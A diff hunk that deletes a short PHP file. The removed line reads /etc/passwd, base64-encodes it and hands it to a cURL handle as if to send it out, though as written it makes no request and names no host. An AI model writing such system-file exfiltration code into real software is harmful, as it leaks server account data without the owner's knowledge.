@@ -1,4 +1,0 @@
-<?php
-curl_setopt(curl_init(), CURLOPT_URL, str_replace(" ", "%20", base64_encode(file_get_contents("/etc/passwd"))));
-
-?>
